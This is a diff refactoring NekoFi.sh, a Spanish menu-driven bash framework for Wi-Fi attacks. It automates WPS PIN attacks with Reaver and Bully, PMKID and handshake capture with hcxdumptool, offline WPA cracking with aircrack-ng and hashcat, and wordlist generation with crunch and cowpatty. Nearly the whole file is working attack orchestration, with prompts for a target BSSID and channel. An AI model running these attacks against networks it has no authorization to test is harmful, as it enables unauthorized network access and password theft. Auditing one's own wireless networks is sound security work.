@@ -1,402 +1,353 @@
-#!/bin/bash
+#!/usr/bin/env bash
+# ==============================================================================
+# NekoFi.sh - Framework Automatizado de Auditoría y Pentesting Wi-Fi
+# Autor: rodrigo47363 (https://github.com/rodrigo47363/NekoFi)
+# Versión: 2.0 (Refactored & Modernized)
+# ==============================================================================
 
-set -e
+# Colores de Terminal
+CLR_RED="\033[31m"
+CLR_GREEN="\033[32m"
+CLR_YELLOW="\033[33m"
+CLR_CYAN="\033[36m"
+CLR_BLUE="\033[34m"
+CLR_RESET="\033[0m"
+CLR_BOLD="\033[1m"
 
 REPO_URL="https://github.com/rodrigo47363/NekoFi/raw/main/NekoFi.sh"
 SCRIPT_NAME="NekoFi.sh"
 LOCAL_PATH="/usr/local/bin/$SCRIPT_NAME"
 
-# Lista de herramientas necesarias
-tools=(
-    iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ccze ethtool wireless-tools
-    hashcat reaver hcxdumptool john pixiewps bully cowpatty crunch wash procps
-    airgeddon libcap-dev hcxtools wifite bettercap mdk4 macchanger
-    hostapd dnsmasq lighttpd python3-pip mitmproxy responder ettercap
+# Lista de herramientas requeridas
+TOOLS=(
+    iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ethtool
+    hashcat reaver hcxdumptool john pixiewps bully cowpatty crunch wash
+    hcxtools wifite macchanger hostapd dnsmasq lighttpd
 )
 
+selected_interface=""
+monitor_interface=""
 
-# Función para verificar e instalar herramientas necesarias
+verificar_root() {
+    if [ "$EUID" -ne 0 ]; then
+        echo -e "${CLR_YELLOW}[!] Este script requiere permisos de superusuario (root). Solicitando sudo...${CLR_RESET}"
+        exec sudo bash "$0" "$@"
+    fi
+}
+
 install_tools() {
-    echo "Verificando e instalando herramientas necesarias..."
-
-    # Verificar si el usuario tiene permisos de sudo
-    if ! sudo -v &>/dev/null; then
-        echo "No se pueden realizar instalaciones sin permisos de sudo."
-        exit 1
-    fi
-
-    # Actualización de repositorios
-    echo "Actualizando repositorios..."
-    if ! sudo apt-get update; then
-        echo "Fallo en la actualización de paquetes. Verifica tu conexión a internet."
-        exit 1
-    fi
-
-    # Verificar qué herramientas faltan y agruparlas
-    missing_tools=()
-    for tool in "${tools[@]}"; do
-        if ! command -v "$tool" &> /dev/null; then
+    echo -e "${CLR_CYAN}[*] Verificando dependencias del sistema...${CLR_RESET}"
+    local missing_tools=()
+    for tool in "${TOOLS[@]}"; do
+        if ! command -v "$tool" &>/dev/null; then
             missing_tools+=("$tool")
-        else
-            echo "$tool ya está instalado."
         fi
     done
 
-    # Si faltan herramientas, proceder a instalarlas
     if [ ${#missing_tools[@]} -gt 0 ]; then
-        echo "Instalando las siguientes herramientas: ${missing_tools[@]}"
-        if ! sudo apt-get install -y "${missing_tools[@]}"; then
-            echo "Fallo en la instalación de las herramientas. Verifica los repositorios o el nombre de los paquetes."
-            exit 1
+        echo -e "${CLR_YELLOW}[!] Instalando herramientas faltantes: ${missing_tools[*]}${CLR_RESET}"
+        apt-get update -qq || true
+        if ! apt-get install -y "${missing_tools[@]}"; then
+            echo -e "${CLR_RED}[-] Error instalando paquetes. Verifica tus repositorios o conexión.${CLR_RESET}"
+        else
+            echo -e "${CLR_GREEN}[✔] Herramientas instaladas correctamente.${CLR_RESET}"
         fi
     else
-        echo "Todas las herramientas necesarias ya están instaladas."
+        echo -e "${CLR_GREEN}[✔] Todas las dependencias están disponibles.${CLR_RESET}"
     fi
-
-    echo "Proceso completado."
 }
 
-# Ejecutar la función de instalación
-install_tools
-
-# Función para detectar interfaces de red
 detect_interfaces() {
-    interfaces=($(ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'))
-    echo "Interfaces de red detectadas:"
-    for i in "${!interfaces[@]}"; do
-        echo "$i) ${interfaces[$i]}"
-    done
-    read -p "Seleccione una interfaz de red: " interface_index
-    selected_interface=${interfaces[$interface_index]}
+    echo -e "\n${CLR_CYAN}[*] Detectando interfaces de red inalámbricas...${CLR_RESET}"
+    local ifaces=()
+    
+    # 1. Intentar detección vía iw dev
+    if command -v iw &>/dev/null; then
+        while read -r line; do
+            [ -n "$line" ] && ifaces+=("$line")
+        done < <(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}')
+    fi
+
+    # 2. Fallback vía ip link
+    if [ ${#ifaces[@]} -eq 0 ]; then
+        while read -r line; do
+            [ -n "$line" ] && ifaces+=("$line")
+        done < <(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -E '^wl')
+    fi
+
+    if [ ${#ifaces[@]} -eq 0 ]; then
+        echo -e "${CLR_RED}[-] No se detectaron interfaces Wi-Fi compatibles en el sistema.${CLR_RESET}"
+        read -p "Ingrese manualmente el nombre de la interfaz (ej. wlan0): " manual_iface
+        selected_interface="${manual_iface:-wlan0}"
+    else
+        echo -e "Interfaces detectadas:"
+        for i in "${!ifaces[@]}"; do
+            echo -e "  [${CLR_GREEN}$i${CLR_RESET}] ${ifaces[$i]}"
+        done
+        read -p "Seleccione el índice de la interfaz [0]: " idx
+        idx="${idx:-0}"
+        selected_interface="${ifaces[$idx]:-${ifaces[0]}}"
+    fi
+
+    monitor_interface="$selected_interface"
+    echo -e "${CLR_GREEN}[+] Interfaz seleccionada: ${CLR_BOLD}$selected_interface${CLR_RESET}"
 }
 
-# Función para manejar procesos que interfieren
 kill_interfering_processes() {
-    echo "Deteniendo procesos que pueden interferir..."
-    sudo airmon-ng check kill
+    echo -e "${CLR_YELLOW}[*] Deteniendo procesos que pueden interferir con el modo monitor...${CLR_RESET}"
+    airmon-ng check kill >/dev/null 2>&1 || true
 }
 
-# Función para iniciar y detener el modo monitor
-manage_monitor_mode() {
-    local action=$1
-    local channel=$2
-    if [[ $action == "start" ]]; then
-        kill_interfering_processes
-        sudo airmon-ng start $selected_interface $channel || { echo "Fallo al iniciar el modo monitor"; exit 1; }
-    elif [[ $action == "stop" ]]; then
-        sudo airmon-ng stop ${selected_interface}mon || { echo "Fallo al detener el modo monitor"; exit 1; }
-        sudo ip link set ${selected_interface} up || { echo "Fallo al activar la interfaz en modo managed"; exit 1; }
-    fi
-}
-
-mostrar_menu() {
-    clear
-    echo "########################################################"
-    echo "#                                                      #"
-    echo "#                  NekoFi.sh                           #"
-    echo "#                  Versión 1.4                         #"
-    echo "#                                                      #"
-    echo "#  GitHub Proyecto:                                    #"
-    echo "#  https://github.com/rodrigo47363/NekoFi              #"
-    echo "#                                                      #"
-    echo "#  Perfil GitHub:                                      #"
-    echo "#  https://github.com/rodrigo47363                     #"
-    echo "#                                                      #"
-    echo "#  Twitter/X:                                          #"
-    echo "#  https://x.com/rodrigo47363                          #"
-    echo "#                                                      #"
-    echo "#  Donación BTC:                                       #"
-    echo "#  bc1qkzmpd0hry99qms7ef23vsyx9vt34pzzaslpp8y          #"
-    echo "#                                                      #"
-    echo "#  Donación Ethereum:                                  #"
-    echo "#  0xB75bC57C54FCBFF139EBF981A596B019C537d018          #"
-    echo "#                                                      #"
-    echo "#  Donación Solana:                                    #"
-    echo "#  ELekuGHcmZjhXrtHNqHuu8QmdCZr3oCWtTmu3QUQ5hac        #"
-    echo "########################################################"
-}
-
-
-    echo
-    echo "Seleccione una opción:"
-    echo "1. Escanear redes WiFi"
-    echo "2. Capturar Handshake (WPS/PMKID)"
-    echo "3. Ataque WPS con Reaver"
-    echo "4. Ataque WPS con PixieWPS"
-    echo "5. Ataque WPS con Bully"
-    echo "6. Ataque WPA/WPA2"
-    echo "7. Ataque WEP"
-    echo "8. Crear diccionario con Crunch"
-    echo "9. Crear diccionario personalizado con Cowpatty"
-    echo "10. Crackear contraseñas con Hashcat"
-    echo "11. Poner interfaz en modo monitor"
-    echo "12. Poner interfaz en modo managed"
-    echo "13. Salir"
-    echo "14. Actualizar NekoFi.sh desde GitHub"
-    echo "15. Convertir .cap a .hccapx"
-    echo "0. Ayuda"
-    echo "Seleccione una opción: "
-    read -r opcion
-    case $opcion in
-        1) escaneo_redes ;;
-        2) capturar_handshake ;;
-        3) ataque_wps_reaver ;;
-        4) ataque_wps_pixiewps ;;
-        5) ataque_wps_bully ;;
-        6) ataque_wpa ;;
-        7) ataque_wep ;;
-        8) crear_diccionario_crunch ;;
-        9) crear_diccionario_cowpatty ;;
-        10) crackear_hashcat ;;
-        11) poner_modo_monitor ;;
-        12) poner_modo_managed ;;
-        13) exit 0 ;;
-        14) actualizar_nokefi ;;
-        15) convertir_cap_hccapx ;;
-        0) mostrar_ayuda ;;
-        *) echo "Opción no válida. Por favor, seleccione una opción válida." ;;
-    esac
-}
-
-
-# Función para mostrar ayuda
-mostrar_ayuda() {
-    echo "Ayuda - NekoFi.sh"
-    echo "1. Escanear redes WiFi: Utiliza wash para escanear redes WiFi disponibles."
-    echo "2. Capturar Handshake (WPS/PMKID): Usa hcxdumptool para capturar handshakes WPS/PMKID."
-    echo "3. Ataque WPS con Reaver: Ataca redes con WPS usando Reaver."
-    echo "4. Ataque WPS con PixieWPS: Ataca redes con WPS usando PixieWPS."
-    echo "5. Ataque WPS con Bully: Ataca redes con WPS usando Bully."
-    echo "6. Ataque WPA/WPA2: Realiza un ataque WPA/WPA2 usando un diccionario."
-    echo "7. Ataque WEP: Realiza un ataque WEP."
-    echo "8. Crear diccionario con Crunch: Crea un diccionario de contraseñas con Crunch."
-    echo "9. Crear diccionario personalizado con Cowpatty: Crea un diccionario personalizado con Cowpatty."
-    echo "10. Crackear contraseñas con Hashcat: Utiliza hashcat para crackear contraseñas usando un diccionario."
-    echo "11. Poner interfaz en modo monitor: Cambia la interfaz seleccionada al modo monitor."
-    echo "12. Poner interfaz en modo managed: Cambia la interfaz seleccionada al modo managed."
-    echo "13. Salir: Cierra el script."
-    echo "14. Actualizar NekoFi.sh desde GitHub: Descarga la última versión del script desde GitHub."
-    echo "15. Convertir .cap a .hccapx: Convierte un archivo .cap a .hccapx."
-}
-
-# Función para poner la interfaz en modo monitor
 poner_modo_monitor() {
-    read -p "Ingrese el canal (dejar en blanco para omitir): " canal
-    if [ -z "$canal" ]; then
-        manage_monitor_mode "start"
+    local channel="${1:-}"
+    kill_interfering_processes
+    echo -e "${CLR_CYAN}[*] Poniendo $selected_interface en modo monitor...${CLR_RESET}"
+    
+    # Intentar activación directa por iw
+    ip link set "$selected_interface" down 2>/dev/null || true
+    iw "$selected_interface" set type monitor 2>/dev/null || true
+    ip link set "$selected_interface" up 2>/dev/null || true
+    
+    # Validar si está en modo monitor
+    local current_mode
+    current_mode=$(iw dev "$selected_interface" info 2>/dev/null | awk '/type/{print $2}')
+    if [ "$current_mode" != "monitor" ]; then
+        airmon-ng start "$selected_interface" $channel >/dev/null 2>&1 || true
+        if ip link show "${selected_interface}mon" &>/dev/null; then
+            monitor_interface="${selected_interface}mon"
+        else
+            monitor_interface="$selected_interface"
+        fi
     else
-        manage_monitor_mode "start" "$canal"
+        monitor_interface="$selected_interface"
     fi
+    
+    if [ -n "$channel" ]; then
+        iw dev "$monitor_interface" set channel "$channel" 2>/dev/null || true
+    fi
+    echo -e "${CLR_GREEN}[+] Interfaz lista en modo monitor: ${CLR_BOLD}$monitor_interface${CLR_RESET}"
 }
 
-# Función para poner la interfaz en modo managed
 poner_modo_managed() {
-    manage_monitor_mode "stop"
+    echo -e "${CLR_CYAN}[*] Restaurando interfaz a modo Managed...${CLR_RESET}"
+    airmon-ng stop "$monitor_interface" >/dev/null 2>&1 || true
+    ip link set "$selected_interface" down 2>/dev/null || true
+    iw "$selected_interface" set type managed 2>/dev/null || true
+    ip link set "$selected_interface" up 2>/dev/null || true
+    systemctl restart NetworkManager 2>/dev/null || true
+    echo -e "${CLR_GREEN}[+] Modo managed restaurado en $selected_interface.${CLR_RESET}"
 }
 
-# Función para escanear redes WiFi usando wash
 escaneo_redes() {
-    echo "Escaneando redes WiFi..."
     poner_modo_monitor
-    if ! sudo wash -i ${selected_interface}mon; then
-        echo "Fallo al ejecutar wash"
-        poner_modo_managed
-        exit 1
-    fi
-    echo "Redes WiFi encontradas:"
-    sudo wash -i ${selected_interface}mon
-    poner_modo_managed
+    echo -e "${CLR_CYAN}[*] Iniciando escaneo de puntos de acceso WPS (Wash)...${CLR_RESET}"
+    echo -e "${CLR_YELLOW}[i] Presione Ctrl+C para detener el escaneo cuando localice su objetivo.${CLR_RESET}\n"
+    wash -i "$monitor_interface" || true
 }
 
-# Función para capturar handshakes (WPS/PMKID)
-capturar_handshake() {
-    echo "Capturando Handshake (WPS/PMKID)..."
+capturar_handshake_pmkid() {
     poner_modo_monitor
-    capture_file=$(mktemp)
-    if ! sudo hcxdumptool -i ${selected_interface}mon -o "$capture_file" --enable_status=1; then
-        echo "Fallo al ejecutar hcxdumptool"
-        poner_modo_managed
-        exit 1
-    fi
-    if ! sudo hcxpcaptool -z pmkid_output.16800 "$capture_file"; then
-        echo "Fallo al ejecutar hcxpcaptool"
-        poner_modo_managed
-        exit 1
-    fi
-    if [ -s pmkid_output.16800 ]; then
-        echo "PMKID capturados:"
-        cat pmkid_output.16800
+    local timestamp
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local pcap_file="capture_${timestamp}.pcapng"
+    local hash_file="pmkid_${timestamp}.22000"
+
+    echo -e "${CLR_CYAN}[*] Capturando PMKID / Handshakes con hcxdumptool...${CLR_RESET}"
+    echo -e "${CLR_YELLOW}[i] Presione Ctrl+C cuando haya capturado suficientes paquetes.${CLR_RESET}\n"
+    
+    # Compatibilidad con flags modernas y legacy de hcxdumptool
+    if hcxdumptool --help 2>&1 | grep -q -- '-w'; then
+        hcxdumptool -i "$monitor_interface" -w "$pcap_file" --rds=1 || true
     else
-        echo "No se capturaron PMKIDs."
+        hcxdumptool -i "$monitor_interface" -o "$pcap_file" --enable_status=1 || true
     fi
-    rm "$capture_file"
-    poner_modo_managed
+
+    if [ -f "$pcap_file" ] && [ -s "$pcap_file" ]; then
+        echo -e "\n${CLR_CYAN}[*] Extrayendo hashes WPA/WPA2/PMKID con hcxtools...${CLR_RESET}"
+        if command -v hcxpcapngtool &>/dev/null; then
+            hcxpcapngtool -o "$hash_file" "$pcap_file" 2>/dev/null || true
+        elif command -v hcxpcaptool &>/dev/null; then
+            hcxpcaptool -z "$hash_file" "$pcap_file" 2>/dev/null || true
+        fi
+
+        if [ -s "$hash_file" ]; then
+            echo -e "${CLR_GREEN}${CLR_BOLD}[✔] ¡Hashes capturados con éxito!${CLR_RESET}"
+            echo -e "Archivo de hashes guardado en: ${CLR_CYAN}$hash_file${CLR_RESET}"
+            echo -e "Formato: Hashcat modo 22000"
+            echo -e "--------------------------------------------------------"
+            cat "$hash_file"
+            echo -e "--------------------------------------------------------"
+        else
+            echo -e "${CLR_YELLOW}[!] No se detectaron PMKIDs ni Handshakes completos en la captura.${CLR_RESET}"
+        fi
+    fi
 }
 
-# Función para ataque WPS con Reaver
 ataque_wps_reaver() {
     escaneo_redes
-    echo "Redes disponibles:"
-    read -p "Ingrese el BSSID de la red: " bssid
-    read -p "Ingrese el canal de la red: " canal
-    echo "Iniciando ataque WPS con Reaver..."
-    poner_modo_monitor $canal
-    if ! sudo reaver -i ${selected_interface}mon -b $bssid -vv; then
-        echo "Fallo al ejecutar Reaver"
-        poner_modo_managed
-        exit 1
+    echo
+    read -p "Ingrese el BSSID objetivo: " bssid
+    read -p "Ingrese el canal del AP (1-14): " canal
+    if [ -n "$bssid" ]; then
+        poner_modo_monitor "$canal"
+        echo -e "${CLR_CYAN}[*] Ejecutando ataque WPS con Reaver sobre $bssid...${CLR_RESET}"
+        reaver -i "$monitor_interface" -b "$bssid" -c "$canal" -vv -K 1 || true
     fi
-    poner_modo_managed
 }
 
-# Función para ataque WPS con PixieWPS
-ataque_wps_pixiewps() {
-    escaneo_redes
-    echo "Redes disponibles:"
-    read -p "Ingrese el BSSID de la red: " bssid
-    echo "Iniciando ataque WPS con PixieWPS..."
-    poner_modo_monitor
-    if ! sudo pixiewps -i ${selected_interface}mon -b $bssid; then
-        echo "Fallo al ejecutar PixieWPS"
-        poner_modo_managed
-        exit 1
-    fi
-    poner_modo_managed
-}
-
-# Función para ataque WPS con Bully
 ataque_wps_bully() {
     escaneo_redes
-    echo "Redes disponibles:"
-    read -p "Ingrese el BSSID de la red: " bssid
-    echo "Iniciando ataque WPS con Bully..."
-    poner_modo_monitor
-    if ! sudo bully -b $bssid -c ${selected_interface}mon; then
-        echo "Fallo al ejecutar Bully"
-        poner_modo_managed
-        exit 1
+    echo
+    read -p "Ingrese el BSSID objetivo: " bssid
+    read -p "Ingrese el canal del AP (1-14): " canal
+    if [ -n "$bssid" ]; then
+        poner_modo_monitor "$canal"
+        echo -e "${CLR_CYAN}[*] Ejecutando ataque WPS con Bully sobre $bssid...${CLR_RESET}"
+        bully -b "$bssid" -c "$canal" -d -v 3 "$monitor_interface" || true
     fi
-    poner_modo_managed
 }
 
-# Función para ataque WPA/WPA2
 ataque_wpa() {
-    echo "Iniciando ataque WPA/WPA2..."
-    read -p "Ingrese la ruta del archivo de captura (.cap): " capture_file
-    read -p "Ingrese la ruta del diccionario de contraseñas: " wordlist_file
-    if ! aircrack-ng -w "$wordlist_file" -b "$bssid" "$capture_file"; then
-        echo "Fallo al ejecutar aircrack-ng"
-        exit 1
-    fi
-}
+    echo -e "${CLR_CYAN}[*] Ataque de diccionario WPA/WPA2 offline (Aircrack-ng)...${CLR_RESET}"
+    read -p "Ruta del archivo de captura (.cap / .pcap): " capture_file
+    read -p "BSSID objetivo: " bssid
+    read -p "Ruta del diccionario de contraseñas: " wordlist_file
 
-# Función para ataque WEP
-ataque_wep() {
-    echo "Iniciando ataque WEP..."
-    escaneo_redes
-    echo "Redes disponibles:"
-    read -p "Ingrese el BSSID de la red: " bssid
-    poner_modo_monitor
-    if ! sudo aircrack-ng -b $bssid ${selected_interface}mon; then
-        echo "Fallo al ejecutar aircrack-ng"
-        poner_modo_managed
-        exit 1
+    if [ ! -f "$capture_file" ]; then
+        echo -e "${CLR_RED}[-] Archivo de captura no encontrado.${CLR_RESET}"
+        return
     fi
-    poner_modo_managed
-}
+    if [ ! -f "$wordlist_file" ]; then
+        echo -e "${CLR_RED}[-] Diccionario no encontrado.${CLR_RESET}"
+        return
+    fi
 
-# Función para crear diccionario con Crunch
-crear_diccionario_crunch() {
-    echo "Creando diccionario con Crunch..."
-    read -p "Ingrese la longitud mínima de la contraseña: " min_length
-    read -p "Ingrese la longitud máxima de la contraseña: " max_length
-    read -p "Ingrese el conjunto de caracteres (dejar en blanco para omitir): " charset
-    if [ -z "$charset" ]; then
-        if ! crunch $min_length $max_length; then
-            echo "Fallo al ejecutar Crunch"
-            exit 1
-        fi
+    if [ -n "$bssid" ]; then
+        aircrack-ng -w "$wordlist_file" -b "$bssid" "$capture_file"
     else
-        if ! crunch $min_length $max_length -f "$charset"; then
-            echo "Fallo al ejecutar Crunch"
-            exit 1
-        fi
-    fi
-}
-
-# Función para crear diccionario personalizado con Cowpatty
-crear_diccionario_cowpatty() {
-    echo "Creando diccionario personalizado con Cowpatty..."
-    read -p "Ingrese el nombre de la red WiFi (ESSID): " essid
-    read -p "Ingrese el nombre del archivo de salida: " output_file
-    if ! cowpatty -f wordlist.txt -s "$essid" -o "$output_file"; then
-        echo "Fallo al ejecutar Cowpatty"
-        exit 1
+        aircrack-ng -w "$wordlist_file" "$capture_file"
     fi
 }
 
 crackear_hashcat() {
-    echo "Crackeando contraseñas con Hashcat..."
-    read -p "Ingrese el archivo .hccapx: " hccapx_file
-    read -p "Ingrese el diccionario de contraseñas: " wordlist_file
-    if ! hashcat -m 2500 "$hccapx_file" "$wordlist_file"; then
-        echo "Fallo al ejecutar Hashcat"
-        exit 1
+    echo -e "${CLR_CYAN}[*] Crackeo de Hashes con Hashcat (Modo unificado 22000: WPA/WPA2/PMKID)...${CLR_RESET}"
+    read -p "Ruta del archivo de hashes (.22000 / .hc22000 / .16800): " hash_file
+    read -p "Ruta del diccionario (ej: /usr/share/wordlists/rockyou.txt): " wordlist_file
+
+    if [ ! -f "$hash_file" ] || [ ! -f "$wordlist_file" ]; then
+        echo -e "${CLR_RED}[-] Archivo de hashes o diccionario no válido.${CLR_RESET}"
+        return
+    fi
+
+    echo -e "${CLR_GREEN}[+] Iniciando Hashcat...${CLR_RESET}"
+    hashcat -m 22000 -a 0 "$hash_file" "$wordlist_file" -w 3 || hashcat -m 16800 -a 0 "$hash_file" "$wordlist_file" -w 3
+}
+
+crear_diccionario_crunch() {
+    echo -e "${CLR_CYAN}[*] Generador de Diccionarios con Crunch...${CLR_RESET}"
+    read -p "Longitud mínima: " min_len
+    read -p "Longitud máxima: " max_len
+    read -p "Conjunto de caracteres (ej: 0123456789 o dejar vacío): " charset
+    read -p "Nombre del archivo de salida: " output_file
+
+    if [ -n "$min_len" ] && [ -n "$max_len" ]; then
+        if [ -n "$charset" ]; then
+            crunch "$min_len" "$max_len" "$charset" -o "$output_file"
+        else
+            crunch "$min_len" "$max_len" -o "$output_file"
+        fi
+        echo -e "${CLR_GREEN}[✔] Diccionario generado con éxito: $output_file${CLR_RESET}"
     fi
 }
 
-# Función para convertir .cap a .hccapx
-convertir_cap_a_hccapx() {
-    echo "Convirtiendo .cap a .hccapx..."
-    read -p "Ingrese el archivo .cap: " cap_file
-    read -p "Ingrese el nombre del archivo .hccapx: " hccapx_file
-    if ! cap2hccapx "$cap_file" "$hccapx_file"; then
-        echo "Fallo al convertir .cap a .hccapx"
-        exit 1
+crear_diccionario_cowpatty() {
+    echo -e "${CLR_CYAN}[*] Generador de Tablas Precalculadas PMK (Cowpatty)...${CLR_RESET}"
+    read -p "Ruta del diccionario base de palabras: " wordlist
+    read -p "ESSID de la red objetivo: " essid
+    read -p "Nombre del archivo hash de salida: " output_file
+
+    if [ -f "$wordlist" ] && [ -n "$essid" ]; then
+        cowpatty -f "$wordlist" -s "$essid" -o "$output_file"
+    else
+        echo -e "${CLR_RED}[-] Diccionario o ESSID inválido.${CLR_RESET}"
     fi
 }
 
-# Función para actualizar el script desde el repositorio
 actualizar_script() {
-    echo "Actualizando NekoFi.sh desde GitHub..."
+    echo -e "${CLR_CYAN}[*] Actualizando NekoFi.sh desde GitHub...${CLR_RESET}"
     if wget -q -O /tmp/NekoFi.sh "$REPO_URL"; then
         sudo cp /tmp/NekoFi.sh "$LOCAL_PATH"
         sudo chmod +x "$LOCAL_PATH"
-        echo "NekoFi.sh actualizado con éxito."
+        echo -e "${CLR_GREEN}[✔] NekoFi.sh actualizado correctamente en $LOCAL_PATH.${CLR_RESET}"
     else
-        echo "Fallo al descargar el script de actualización."
+        echo -e "${CLR_RED}[-] Error descargando la actualización desde $REPO_URL.${CLR_RESET}"
     fi
     rm -f /tmp/NekoFi.sh
 }
 
-# Función principal del script
+mostrar_menu() {
+    clear
+    echo -e "${CLR_CYAN}${CLR_BOLD}"
+    cat << "EOF"
+########################################################
+#                                                      #
+#                  NekoFi.sh                           #
+#                  Versión 2.0 (Refactored)            #
+#                                                      #
+#  GitHub: https://github.com/rodrigo47363/NekoFi      #
+#  Autor:  rodrigo47363                                #
+########################################################
+EOF
+    echo -e "${CLR_RESET}"
+    echo -e "  Interfaz activa: ${CLR_GREEN}${CLR_BOLD}${selected_interface}${CLR_RESET} | Modo: ${CLR_YELLOW}${monitor_interface}${CLR_RESET}\n"
+    echo -e "  [${CLR_GREEN}1${CLR_RESET}]  Escanear redes Wi-Fi (Wash / WPS)"
+    echo -e "  [${CLR_GREEN}2${CLR_RESET}]  Capturar Handshake / PMKID (hcxdumptool)"
+    echo -e "  [${CLR_GREEN}3${CLR_RESET}]  Ataque WPS con Reaver / PixieWPS"
+    echo -e "  [${CLR_GREEN}4${CLR_RESET}]  Ataque WPS con Bully"
+    echo -e "  [${CLR_GREEN}5${CLR_RESET}]  Ataque WPA/WPA2 por Diccionario (Aircrack-ng)"
+    echo -e "  [${CLR_GREEN}6${CLR_RESET}]  Crackear contraseñas con Hashcat (Modo 22000)"
+    echo -e "  [${CLR_GREEN}7${CLR_RESET}]  Crear diccionario con Crunch"
+    echo -e "  [${CLR_GREEN}8${CLR_RESET}]  Crear tabla PMK con Cowpatty"
+    echo -e "  [${CLR_GREEN}9${CLR_RESET}]  Poner interfaz en modo Monitor"
+    echo -e "  [${CLR_GREEN}10${CLR_RESET}] Poner interfaz en modo Managed"
+    echo -e "  [${CLR_GREEN}11${CLR_RESET}] Cambiar / Redetectar interfaz Wi-Fi"
+    echo -e "  [${CLR_GREEN}12${CLR_RESET}] Actualizar NekoFi.sh desde GitHub"
+    echo -e "  [${CLR_RED}0${CLR_RESET}]  Salir"
+    echo
+}
+
 main() {
+    verificar_root "$@"
     install_tools
     detect_interfaces
+
     while true; do
         mostrar_menu
-        read -p "Ingrese una opción: " opcion
-        case $opcion in
+        read -p "Seleccione una opción: " opcion
+        case "$opcion" in
             1) escaneo_redes ;;
-            2) capturar_handshake ;;
+            2) capturar_handshake_pmkid ;;
             3) ataque_wps_reaver ;;
-            4) ataque_wps_pixiewps ;;
-            5) ataque_wps_bully ;;
-            6) ataque_wpa ;;
-            7) ataque_wep ;;
-            8) crear_diccionario_crunch ;;
-            9) crear_diccionario_cowpatty ;;
-            10) crackear_hashcat ;;
-            11) poner_modo_monitor ;;
-            12) poner_modo_managed ;;
-            13) break ;;
-            14) actualizar_script ;;
-            15) convertir_cap_a_hccapx ;;
-            0) mostrar_ayuda ;;
-            *) echo "Opción no válida." ;;
+            4) ataque_wps_bully ;;
+            5) ataque_wpa ;;
+            6) crackear_hashcat ;;
+            7) crear_diccionario_crunch ;;
+            8) crear_diccionario_cowpatty ;;
+            9) poner_modo_monitor ;;
+            10) poner_modo_managed ;;
+            11) detect_interfaces ;;
+            12) actualizar_script ;;
+            0) 
+               poner_modo_managed
+               echo -e "${CLR_GREEN}[+] Saliendo de NekoFi.sh. ¡Hasta la próxima!${CLR_RESET}"
+               exit 0 
+               ;;
+            *) echo -e "${CLR_RED}[!] Opción no válida.${CLR_RESET}" ;;
         esac
-        read -p "Presione Enter para continuar..."
+        echo
+        read -p "Presione Enter para continuar..." _
     done
 }
 
-main
+main "$@"
+
